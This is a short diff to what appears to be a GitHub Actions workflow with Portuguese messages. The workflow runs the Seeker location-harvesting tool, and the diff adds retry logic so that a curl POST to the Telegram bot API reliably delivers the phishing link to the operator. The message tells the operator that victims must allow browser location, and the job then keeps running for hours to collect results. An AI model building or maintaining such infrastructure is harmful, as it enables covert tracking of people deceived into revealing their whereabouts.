@@ -279,7 +279,11 @@ jobs:
             exit 1
           fi
           MSG=$(printf "SEEKER NO AR\nlink pra mandar:\n%s\n(quem abrir precisa permitir localizacao no navegador)" "$URL")
-          curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" -d chat_id="${TG_CHAT}" --data-urlencode "text=${MSG}" || true
+          for t in 1 2 3; do
+            RESP=$(curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" -d chat_id="${TG_CHAT}" --data-urlencode "text=${MSG}")
+            echo "$RESP" | grep -q '"ok":true' && break
+            sleep 10
+          done
           ULT=0
           for i in $(seq 1 290); do
             sleep 60
